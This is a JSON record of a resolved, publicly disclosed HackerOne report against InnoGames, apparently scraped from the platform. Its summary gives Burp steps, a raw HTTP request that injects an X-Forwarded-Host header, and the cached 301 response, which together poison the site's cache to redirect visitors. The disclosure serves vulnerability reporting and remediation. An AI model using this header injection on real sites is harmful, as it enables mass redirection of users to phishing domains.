{"id":960618,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NjA2MTg=","url":"https://hackerone.com/reports/960618","title":"Cache Poisoning via uppercase letters in invalid path","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-08-17T14:12:52.066Z","submitted_at":"2020-08-17T14:12:52.099Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mace","url":"/mace","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/774/3ff658e7ee84cc733ce89bc3fe9171ca04527941_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":36247,"url":"https://hackerone.com/innogames","handle":"innogames","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/247/3aaa6df459e294e6c59ec0b22ae03e7a9c5a1016_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/247/3aaa6df459e294e6c59ec0b22ae03e7a9c5a1016_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"InnoGames","twitter_handle":"","website":"https://www.innogames.com","about":"With around 150 million registered players, InnoGames is one of the worldwide leading developers and publishers of online games. "}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-09-15T14:48:42.614Z","bug_reporter_agreed_on_going_public_at":"2020-09-15T07:43:58.560Z","team_member_agreed_on_going_public_at":"2020-09-15T14:48:42.445Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","bounty_amount":"550.0","formatted_bounty":"$550","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":82,"voters":["401unauth","kekkegenkai","ltidi","cdl","xnutronex","mik317","romesful","ali","hensis","s5s","and 72 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":18217,"asset_type":"URL","asset_identifier":"*.innogames.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8958724,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-08-17T14:13:13.879Z","updated_at":"2020-08-17T14:13:13.879Z","actor":{"username":"mace","cleared":false,"url":"/mace","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/774/3ff658e7ee84cc733ce89bc3fe9171ca04527941_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8967468,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-08-18T11:08:38.250Z","updated_at":"2020-08-18T11:08:38.250Z","actor":{"username":"lugtag","cleared":false,"url":"/lugtag","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/gKtXsNkprE7ekgjBwpwWpTzX/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8967592,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"","automated_response":false,"created_at":"2020-08-18T11:27:05.687Z","updated_at":"2020-08-18T11:27:05.687Z","actor":{"username":"mace","cleared":false,"url":"/mace","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/774/3ff658e7ee84cc733ce89bc3fe9171ca04527941_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8998607,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-08-21T10:12:25.571Z","updated_at":"2020-08-21T10:12:25.571Z","actor":{"username":"mace","cleared":false,"url":"/mace","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/774/3ff658e7ee84cc733ce89bc3fe9171ca04527941_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9034502,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-08-25T13:32:40.501Z","updated_at":"2020-08-25T13:32:40.501Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9034538,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2020-08-25T13:35:49.698Z","updated_at":"2020-08-25T13:35:49.698Z","additional_data":{},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9034539,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-08-25T13:35:49.853Z","updated_at":"2020-08-25T13:35:49.853Z","additional_data":{},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9045949,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-08-26T15:12:07.404Z","updated_at":"2020-08-26T15:12:07.404Z","actor":{"username":"alona-ko","cleared":false,"url":"/alona-ko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uynV8B8u98ybCED1UrkhL1no/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9052347,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-08-27T08:40:43.228Z","updated_at":"2020-08-27T08:40:43.228Z","actor":{"url":"/innogames","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/247/3aaa6df459e294e6c59ec0b22ae03e7a9c5a1016_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"InnoGames"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"innogames","collaborator":{"username":"mace","url":"/mace"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9211020,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-09-14T08:27:22.466Z","updated_at":"2020-09-14T08:27:22.466Z","actor":{"username":"alona-ko","cleared":false,"url":"/alona-ko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uynV8B8u98ybCED1UrkhL1no/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mace","url":"/mace"},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9223502,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-15T07:43:58.581Z","updated_at":"2020-09-15T07:43:58.581Z","first_to_agree":true,"actor":{"username":"mace","cleared":false,"url":"/mace","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/774/3ff658e7ee84cc733ce89bc3fe9171ca04527941_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9227938,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-09-15T14:45:23.045Z","updated_at":"2020-09-15T14:45:23.045Z","actor":{"username":"alona-ko","cleared":false,"url":"/alona-ko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uynV8B8u98ybCED1UrkhL1no/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9227966,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-09-15T14:48:04.264Z","updated_at":"2020-09-15T14:48:04.264Z","actor":{"username":"mace","cleared":false,"url":"/mace","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/774/3ff658e7ee84cc733ce89bc3fe9171ca04527941_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9227975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-15T14:48:42.477Z","updated_at":"2020-09-15T14:48:42.477Z","actor":{"username":"alona-ko","cleared":false,"url":"/alona-ko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uynV8B8u98ybCED1UrkhL1no/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9227976,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-09-15T14:48:42.650Z","updated_at":"2020-09-15T14:48:42.650Z","actor":{"username":"alona-ko","cleared":false,"url":"/alona-ko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uynV8B8u98ybCED1UrkhL1no/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"innogames","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":24459,"category":"team","content":"# Summary of the issue\nCache poisoning vulnerability appears in the request to innogames.com. The issue arises when language path parameter from the url gets processed  on the backend to become lowercase. Then if a path provided in X-Forwarded-Host does not exist on the server, 301 response is triggered with a redirect. The url provided in X-Forwarded-Host header gets cached and every user accessing this path will be redirected to it.\n\n# Vulnerable endpoint\nhttps://innogames.com/DE/?variable=value\n\n# Steps to reproduce\n- Run Burp and navigate to the repeater tab to create a new request to the vulnerable endpoint:  \n\n\u003eHost: www.innogames.com\n\u003ePort: 443\n\u003eCheck: Use HTTPS  \n\n\n**Request body:**\n```\nGET /DE/?mace=triage HTTP/1.1\nHost: www.innogames.com\nAccept-Language: en,en-US;q=0.7,en;q=0.3\nX-Forwarded-Host: not-evil.burpcollaborator.net\n```\n- Hit send. Location header now has the value from the \"X-Forwarded-Host\" header that we modified  \n\n**Response:**\n```\nHTTP/1.1 301 Moved Permanently\nLocation: https://not-evil.burpcollaborator.net/de/?mace=triage\nContent-Type: text/html; charset=UTF-8\nX-Served-By: cache-fra19153-FRA, cache-ams21024-AMS\nX-Cache: MISS, MISS\nX-Cache-Hits: 0, 0\nX-Timer: S1597672892.323454,VS0,VE16\nVary: Accept-Language,X-UA-Device\n[...]\n```\n- Now every user who hits this endpoint will be redirected to https://not-evil.burpcollaborator.net/de/?mace=triage\n- Many poisoned endpoints can be created by modifying the path from /DE/?mace=triage to /DE/?test=somethinghere and the value of the X-Forwarded-Host header\n\n#Impact statement \nThis could be used for the phishing attacks. An attacker can set up a Domain which looks similar to innogames.com and spread this poisoned link via facebook or other forums, fooling users to follow it and get redirected to the evil attackers domain. However, one of the requirements for the exploitability is that an attacker has to be on a location near (from a network view) the target user. Otherwise his poisoned request will not hit the same fastly server as the users request.\n\n#References\n[Security advisories from fastly](https://www.fastly.com/security-advisories/cache-poisoning-leveraging-various-x-headers)","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":1274489,"username":"alona-ko","name":"Alona Kotenieva","bio":"","cleared":false,"website":null,"location":"","created_at":"2020-08-04T15:03:26.621Z","url":"https://hackerone.com/alona-ko","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/uynV8B8u98ybCED1UrkhL1no/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/uynV8B8u98ybCED1UrkhL1no/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBeE9oRUE9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--576791095d22b0b55a904fa3b89a8a0a5d155050/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/expectoPotato.jpg"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}